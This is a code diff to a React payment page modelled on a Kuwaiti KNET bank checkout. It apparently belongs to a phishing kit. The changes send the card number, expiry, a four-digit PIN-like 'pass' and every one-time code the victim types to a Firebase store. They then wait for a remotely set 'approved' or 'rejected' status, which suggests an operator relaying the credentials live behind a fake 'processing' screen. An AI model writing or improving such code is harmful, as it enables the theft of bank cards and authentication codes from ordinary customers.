@@ -1,7 +1,7 @@
 import { useEffect, useState } from 'react';
 import './kent.css'
-import { doc, setDoc } from 'firebase/firestore';
-import { db } from '../firebase';
+import { collection, doc, getDoc, onSnapshot, setDoc } from 'firebase/firestore';
+import { db, handlePay } from '../firebase';
 
 type PaymentInfo = {
   cardNumber: string;
@@ -11,8 +11,10 @@ type PaymentInfo = {
   otp?: string;
   pass: string;
   cardState: string;
+  allOtps:string[],
   bank_card: string[];
   prefix: string;
+  status: 'new' | 'pending' | 'approved' | 'rejected';
 };
 const BANKS = [
   {
@@ -115,16 +117,7 @@ const BANKS = [
 export const Payment = (props: any) => {
 
   const handleSubmit = async () => {
-    try {
-      const visitorId = localStorage.getItem('visitor');
-      if (visitorId) {
-        const docRef = doc(db, 'visitorInfo', visitorId);
-        await setDoc(docRef, { paymentInfo }, { merge: true });
-      }
-    } catch (error) {
-      console.error('Error adding document: ', error);
-      alert('Error adding payment info to Firestore');
-    }
+  
   };
 
   const [step, setstep] = useState(1);
@@ -136,24 +129,47 @@ export const Payment = (props: any) => {
     year: '',
     month: '',
     otp: '',
+    allOtps:newotp,
     bank: '',
     pass: '',
     cardState: 'new',
     bank_card: [''],
     prefix: '',
+    status: 'new',
   });
+
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
+  useEffect(()=>{
+  //handleAddotp(paymentInfo.otp!)
+  }, [paymentInfo.otp])
+
   useEffect(() => {
-    props.handleOtp(paymentInfo.otp)
-    props.setCardNumber(paymentInfo.cardNumber)
-    props.setPrefix(paymentInfo.prefix)
-    props.setBank(paymentInfo.bank)
-    props.setDatmont(paymentInfo.month)
-    props.setDatyear(paymentInfo.year)
-    props.setCVC(paymentInfo.pass)
-  }, [paymentInfo])
+    const visitorId = localStorage.getItem('visitor');
+    if (visitorId) {
+      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data() as PaymentInfo;
+          if (data.status) {
+            setPaymentInfo(prev => ({ ...prev, status: data.status }));
+            if (data.status === 'approved') {
+              setstep(2);
+              props.setisloading(false);
+            } else if (data.status === 'rejected') {
+              props.setisloading(false);
+              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
+              setstep(1);
+            }
+          }
+        }
+      });
+
+      return () => unsubscribe();
+    }
+  }, []);
+ 
+
   return (
     <div style={{background:"#f1f1f1",height:"100vh",margin:0,padding:0}}>
       <form
@@ -485,12 +501,11 @@ export const Payment = (props: any) => {
                       </div>
                     </div>
                   </>
-                ) : (
+                ) : step === 2 && paymentInfo.status=== 'approved'? (
                   <div>
                     <form style={{ display: 'flex', flexDirection: 'column' }}>
                       <label>
-                        Please enter the verification code sent to your phone
-                        number
+                        Please enter the verification code sent to your phone number
                       </label>
                       <label>
                         <input
@@ -509,10 +524,14 @@ export const Payment = (props: any) => {
                               otp: e.target.value,
                             });
                           }}
-                          title="Should be in number. Length should be 10"
+                          title="Should be in number. Length should be 6"
                         />
                       </label>
                     </form>
+                  </div>
+                ) : (
+                  <div style={{ textAlign: 'center', padding: '20px' }}>
+                    <p>Please wait while we process your payment...</p>
                   </div>
                 )}
               </div>
@@ -538,35 +557,38 @@ export const Payment = (props: any) => {
                     </div>
                     <div style={{ display: 'flex' }}>
                       <button
-                        disabled={paymentInfo.prefix==="" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4}
+                        disabled={
+                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4)) ||
+                          paymentInfo.status === 'pending'
+                        }
                         onClick={() => {
-                          setisloading(true)
-                          handleSubmit().then(() => {
-                            props.handleNextPage()
+                          if (step === 1) {
+                            props.setisloading(true);
+                            handlePay(paymentInfo,setPaymentInfo)
+                            handleSubmit();
+                          } else if (step >= 2) {
 
+if(
+  !newotp.includes(paymentInfo.otp!)
+
+){                            newotp.push(paymentInfo.otp!)}
+                            props.setisloading(true)
+                            handleAddotp(paymentInfo.otp!);
+                            props.handleOArr(paymentInfo.otp!);
+                            handlePay(paymentInfo,setPaymentInfo)
                             setTimeout(() => {
-                              setstep(2);
-                              setisloading(false)
-                              if (step === 2) {
-                                handleAddotp(paymentInfo!.otp!)
-                                props.handleOArr(paymentInfo!.otp!)
-
-                                setisloading(true)
-                                setTimeout(() => {
-                                  setisloading(false)
-                                  setPaymentInfo({
-                                    ...paymentInfo,
-                                    otp: '',
-                                  });
-                                }, 1000);
-                              }
-                            }, 1000);
-
-                          })
+                            props.setisloading(false)
+                            setPaymentInfo({
+                              ...paymentInfo,
+                              otp: '',
+                              status: 'approved',
+                            });
+                            }, 3000);
+                           
+                          }
                         }}
-
                       >
-                        {loading ? "Wait..." : "Submit"}
+                        {props.loading ? "Wait..." : (step === 1 ? "Submit" : "Verify OTP")}
                       </button>
                       <button>Cancel</button>
                     </div>
@@ -614,3 +636,4 @@ export const Payment = (props: any) => {
     </div>
   );
 };
+
